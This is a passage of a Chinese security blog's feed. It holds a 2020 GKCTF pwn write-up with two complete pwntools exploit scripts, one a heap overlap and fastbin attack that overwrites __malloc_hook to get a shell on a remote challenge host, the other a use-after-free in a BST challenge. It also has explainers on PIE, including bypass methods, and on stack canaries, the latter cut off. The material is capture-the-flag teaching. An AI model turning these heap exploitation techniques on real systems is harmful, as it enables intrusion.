execute"</span>);</span><br></pre></td></tr></table></figure><p>其中第一个参数是tag，一般传入当前类名即可，主要用于对打印信息进行过滤；第二个参数是msg，即想要打印的具体的内容：</p><p><img src="./day1/9.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;因linux下的前景较窄，所以想了解下android下的一些内容，准备了好久，今天就正式吧。目前第一本书：《第一行代码:Android》。&lt;
      
    
    </summary>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/categories/Android/"/>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/tags/Android/"/>
    
      <category term="开发" scheme="https://nuoye-blog.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>2020GKCTF-pwn</title>
    <link href="https://nuoye-blog.github.io/2020/05/24/wp/2020GKCTF/2020GKCTF-pwn/"/>
    <id>https://nuoye-blog.github.io/2020/05/24/wp/2020GKCTF/2020GKCTF-pwn/</id>
    <published>2020-05-24T15:10:00.000Z</published>
    <updated>2020-05-24T15:09:05.832Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="domo"><a href="#domo" class="headerlink" title="domo"></a>domo</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>挺简单的一道pwn题，具有add、delete、show功能，同时可以任意地址写一字节。</p><p>题目环境是libc2.23的，所以利用方式比较简单。</p><p>首先通过fastbin和unsortbin来leak libc和heap。</p><p>然后申请4个chunk，在申请第二个chunk的时候顺便将第三个chunk的prev_size位设置为第一第二个chunk的大小；然后free掉第一个；再将第三个chunk的size的p位清0，free掉第三个chunk，就可以实现chunk extended。接着重新申请就可以得到两个同时指向chunk2的指针，然后就是fastbin attack那些操作了。。。</p><p>最后getshell的话是利用scanf输入较大数据的时候会malloc（这一机制也会触发malloc_consolidate机制，具体可以在网上找找文章，这里没用到就不详细讲了），已经就可以绕过后面seccomp的防护以及对堆操作的检查。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./domo"</span>)</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="string">"26472"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./domo"</span>).libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"5: Exit"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"size:"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"content:"</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"5: Exit"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index:"</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"5: Exit"</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index:"</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(addr,byte)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"5: Exit"</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"addr:"</span>)</span><br><span class="line">p.sendline(str(addr))</span><br><span class="line">p.recvuntil(<span class="string">"num:"</span>)</span><br><span class="line">p.sendline(byte)</span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">'aaaa'</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">'\n'</span>)<span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) <span class="number">-0x3C4B0A</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'aaaa'</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">'aaaa'</span>)<span class="comment">#2</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'\n'</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) <span class="number">-0xa</span></span><br><span class="line"><span class="keyword">print</span> hex(heap)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0xf2</span>,<span class="string">'a'</span>*<span class="number">0xf0</span>+<span class="string">'\x00\x02'</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">'aaaa'</span>)<span class="comment">#2</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(heap+<span class="number">0x218</span>,<span class="string">'\x00'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">'aaaa'</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'aaaa'</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'aaaa'</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'\x00'</span>*<span class="number">0x3</span>+p64(<span class="number">0</span>)+p64(libc.address+one[<span class="number">3</span>])+p64(libc.sym[<span class="string">'realloc'</span>]+<span class="number">6</span>))<span class="comment">#3</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.sym[<span class="string">'__realloc_hook'</span>])</span><br><span class="line"><span class="comment">#gdb.attach(p,'b malloc')</span></span><br><span class="line">p.recvuntil(<span class="string">"5: Exit"</span>)</span><br><span class="line">p.sendline(<span class="string">"1 "</span>+<span class="string">'1'</span>*<span class="number">0x400</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="BST"><a href="#BST" class="headerlink" title="BST"></a>BST</h2><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>这道题分析了好久，最后出来好像是非预期。。。</p><p>因为不太懂c++，所以是直接在gdb下一步一步调试出功能的，主要就是一个0x30大小的结构体(数据类型。。。呃。。随便就好)：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bst</span>&#123;</span></span><br><span class="line">    <span class="keyword">int64_t</span> idx;</span><br><span class="line">    <span class="keyword">int64_t</span><span class="built_in">size</span>;</span><br><span class="line">    <span class="keyword">int64_t</span>*data_ptr;</span><br><span class="line">    <span class="keyword">int64_t</span>*left_node;</span><br><span class="line">    <span class="keyword">int64_t</span>*right_node;</span><br><span class="line">    <span class="keyword">int64_t</span>*parent_node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在尝试申请5-&gt;3-&gt;4-&gt;2后，free节点3（即同时存在左右节点和父节点）的时候，发现存在uaf漏洞：</p><p>free前：</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">节点<span class="number">5</span>：</span><br><span class="line"><span class="number">0x55bccacf5d10</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000041</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5d20</span>:<span class="number">0x00000005</span><span class="number">0x00000000</span><span class="number">0x00000068</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5d30</span>:<span class="number">0xcacf5d60</span><span class="number">0x000055bc</span><span class="number">0xcacf5e60</span><span class="number">0x000055bc</span></span><br><span class="line"><span class="number">0x55bccacf5d40</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">节点<span class="number">3</span>：</span><br><span class="line"><span class="number">0x55bccacf5e50</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000041</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e60</span>:<span class="number">0x00000003</span><span class="number">0x00000000</span><span class="number">0x00000028</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e70</span>:<span class="number">0xcacf5ea0</span><span class="number">0x000055bc</span><span class="number">0xcacf5e20</span><span class="number">0x000055bc</span></span><br><span class="line"><span class="number">0x55bccacf5e80</span>:<span class="number">0xcacf5de0</span><span class="number">0x000055bc</span><span class="number">0xcacf5d20</span><span class="number">0x000055bc</span></span><br><span class="line">节点<span class="number">4</span>：</span><br><span class="line"><span class="number">0x55bccacf5dd0</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000041</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5de0</span>:<span class="number">0x00000004</span><span class="number">0x00000000</span><span class="number">0x00000068</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5df0</span>:<span class="number">0xcacf5ee0</span><span class="number">0x000055bc</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e00</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0xcacf5e60</span><span class="number">0x000055bc</span></span><br><span class="line">节点<span class="number">2</span>：</span><br><span class="line"><span class="number">0x55bccacf5e10</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000041</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e20</span>:<span class="number">0x00000002</span><span class="number">0x00000000</span><span class="number">0x00000068</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e30</span>:<span class="number">0xcacf5f60</span><span class="number">0x000055bc</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e40</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0xcacf5e60</span><span class="number">0x000055bc</span></span><br></pre></td></tr></table></figure><p>free后：</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">节点<span class="number">5</span>：</span><br><span class="line"><span class="number">0x55bccacf5d10</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000041</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5d20</span>:<span class="number">0x00000005</span><span class="number">0x00000000</span><span class="number">0x00000068</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5d30</span>:<span class="number">0xcacf5d60</span><span class="number">0x000055bc</span><span class="number">0xcacf5e60</span><span class="number">0x000055bc</span></span><br><span class="line"><span class="number">0x55bccacf5d40</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">节点<span class="number">4</span>：</span><br><span class="line"><span class="number">0x55bccacf5e50</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000041</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e60</span>:<span class="number">0x00000004</span><span class="number">0x00000000</span><span class="number">0x00000068</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e70</span>:<span class="number">0xcacf5fe0</span><span class="number">0x000055bc</span><span class="number">0xcacf5e20</span><span class="number">0x000055bc</span></span><br><span class="line"><span class="number">0x55bccacf5e80</span>:<span class="number">0xcacf5de0</span><span class="number">0x000055bc</span><span class="number">0xcacf5d20</span><span class="number">0x000055bc</span></span><br><span class="line">节点<span class="number">2</span>：</span><br><span class="line"><span class="number">0x55bccacf5e10</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000041</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e20</span>:<span class="number">0x00000002</span><span class="number">0x00000000</span><span class="number">0x00000068</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e30</span>:<span class="number">0xcacf5f60</span><span class="number">0x000055bc</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e40</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0xcacf5e60</span><span class="number">0x000055bc</span></span><br><span class="line"><span class="number">0x55bccacf5e50</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000041</span><span class="number">0x00000000</span></span><br></pre></td></tr></table></figure><p>可以明显看到节点4中的右节点指针指向heap+0xde0，而这个地址并不在我们的现有节点中，查看下bins：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x55bccacf5dd0 —▸ 0x55bccacf5e90 ◂— 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x55bccacf5ed0 —▸ 0x55bccacf5c10 —▸ 0x55bccacf5c90 ◂— 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>可以看到这个是一个被free后指针，所以我们可以通过构造申请从而像其中写入flag的地址，然后打印就可以了。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">"./BST"</span>)</span><br><span class="line"><span class="comment">#p = remote("node3.buuoj.cn","26420")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"4.updata_______"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"4.updata_______"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"id:"</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">"size:"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"content"</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"4.updata_______"</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"id:"</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x68</span>,<span class="string">'1'</span>*<span class="number">4</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x28</span>,<span class="string">'2'</span>*<span class="number">4</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x68</span>,<span class="string">'3'</span>*<span class="number">4</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>,<span class="string">'4'</span>*<span class="number">4</span>)</span><br><span class="line">gdb.attach(p, <span class="string">'b *$rebase(0x1789)'</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x28</span>,p64(<span class="number">20</span>)+p64(<span class="number">0x30</span>)+p64(<span class="number">0x66666000</span>))</span><br><span class="line">show()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h1&gt;&lt;h2 id=&quot;domo&quot;&gt;&lt;a href=&quot;#domo&quot; class=&quot;headerlink&quot; title=&quot;domo&quot;&gt;&lt;/a&gt;dom
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="glibc" scheme="https://nuoye-blog.github.io/tags/glibc/"/>
    
      <category term="wp" scheme="https://nuoye-blog.github.io/tags/wp/"/>
    
      <category term="二叉树" scheme="https://nuoye-blog.github.io/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    
      <category term="c++" scheme="https://nuoye-blog.github.io/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>PIE详解</title>
    <link href="https://nuoye-blog.github.io/2020/05/22/pwn/PIE%E8%AF%A6%E8%A7%A3/"/>
    <id>https://nuoye-blog.github.io/2020/05/22/pwn/PIE%E8%AF%A6%E8%A7%A3/</id>
    <published>2020-05-22T14:22:00.000Z</published>
    <updated>2020-05-22T14:56:32.919Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是PIE？"><a href="#什么是PIE？" class="headerlink" title="什么是PIE？"></a>什么是PIE？</h2><p>PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址。</p><h2 id="如何开启PIE"><a href="#如何开启PIE" class="headerlink" title="如何开启PIE?"></a>如何开启PIE?</h2><p>在用gcc编译时，使用如下命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c // 默认情况下，不开启PIE</span><br><span class="line"></span><br><span class="line">gcc -fpie -pie -o <span class="built_in">test</span> test.c // 开启PIE，此时强度为1</span><br><span class="line"></span><br><span class="line">gcc -fPIE -pie -o <span class="built_in">test</span> test.c // 开启PIE，此时为最高强度2</span><br><span class="line"></span><br><span class="line">gcc -fpic -o <span class="built_in">test</span> test.c // 开启PIC，此时强度为1，不会开启PIE</span><br><span class="line"></span><br><span class="line">gcc -fPIC -o <span class="built_in">test</span> test.c // 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></table></figure><p>另外，只有在系统随机化功能开启的时候，PIE才真正的开启。否则，每次运行程序时，程序的装载地址都是固定不变的。</p><p>可以通过如下命令查看当前系统随机化功能的状态：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>其中，返回值有如下含义：</p><ul><li>0 = 关闭</li><li>1 = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。</li><li>2 = 全随机。除了1中所述，还有heap。</li></ul><p>可以通过如下命令修改为全随机（具体可参考<a href="https://blog.csdn.net/counsellor/article/details/81543197）：" target="_blank" rel="noopener">https://blog.csdn.net/counsellor/article/details/81543197）：</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo sysctl -w kernel.randomize_va_space=2</span><br></pre></td></tr></table></figure><h2 id="PIE绕过"><a href="#PIE绕过" class="headerlink" title="PIE绕过"></a>PIE绕过</h2><ol><li>直接leak出地址。</li><li>通过覆盖低位实现有范围限制的任意执行。（最低3/2个byte值为固定的，即在偏移0x000~0xfff任意处执行，必要时可以选择爆破，概率也不算太低）</li><li>直接调用vsyscall。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是PIE？&quot;&gt;&lt;a href=&quot;#什么是PIE？&quot; class=&quot;headerlink&quot; title=&quot;什么是PIE？&quot;&gt;&lt;/a&gt;什么是PIE？&lt;/h2&gt;&lt;p&gt;PIE全称是position-independent executable，中文解释为地址无关可执行
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="gcc" scheme="https://nuoye-blog.github.io/tags/gcc/"/>
    
      <category term="stack" scheme="https://nuoye-blog.github.io/tags/stack/"/>
    
      <category term="protect" scheme="https://nuoye-blog.github.io/tags/protect/"/>
    
      <category term="pie" scheme="https://nuoye-blog.github.io/tags/pie/"/>
    
  </entry>
  
  <entry>
    <title>堆栈保护技术详解</title>
    <link href="https://nuoye-blog.github.io/2020/05/22/pwn/canary%E8%AF%A6%E8%A7%A3/"/>
    <id>https://nuoye-blog.github.io/2020/05/22/pwn/canary%E8%AF%A6%E8%A7%A3/</id>
    <published>2020-05-21T17:17:00.000Z</published>
    <updated>2020-05-21T17:23:41.747Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是堆栈保护技术？"><a href="#什么是堆栈保护技术？" class="headerlink" title="什么是堆栈保护技术？"></a>什么是堆栈保护技术？</h2><p>堆栈保护技术（即Stack canary）是用于防护栈溢出攻击的一种保护机制：在栈上的返回地址跟ebp之前加上一个标志位canary，返回时通过验证这个canary是否被改写，从而判断程序是否被栈溢出攻击。</p><h2 id="如何开启堆栈保护技术？"><a href="#如何开启堆栈保护技术？" class="headerlink" title="如何开启堆栈保护技术？"></a>如何开启堆栈保护技术？</h2><p>用gcc编译时，可以用以下参数来设置：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-<span class="keyword">explicit</span> 只对有明确 stack_protect attribute 的函数开启保护</span><br><span class="line">-fno-<span class="built_in">stack</span>-protector 禁用保护</span><br></pre></td></tr></table></figure><h2 id="canary的产生"><a href="#canary的产生" class="headerlink" title="canary的产生"></a>canary的产生</h2><p>在开启了堆栈保护技术程序中，我们再ida经常可以看到用如下的指令来获取canary：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov     rax, fs:28h</span><br></pre></td></tr></table></figure><p>其中，fs其实是指向当前栈的TLS结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                       thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">  <span class="keyword">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="keyword">int</span> multiple_threads;</span><br><span class="line">  <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><p>fs+0x28h即为stack_guard。</p><p>而TLS结构是由security_init()初始化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 